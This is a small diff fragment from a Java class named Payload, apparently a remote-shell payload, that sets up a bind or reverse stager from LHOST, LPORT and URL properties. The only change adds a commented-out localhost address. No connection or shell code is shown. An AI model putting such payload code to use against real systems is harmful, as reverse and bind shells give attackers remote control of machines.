@@ -174,6 +174,7 @@ public class Payload extends ClassLoader {
             // check what stager to use (bind/reverse)
             int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
             String lHost = props.getProperty("LHOST", null);
+            //String lHost = "127.0.0.1";
             String url = props.getProperty("URL", null);
             InputStream in;
             OutputStream out;
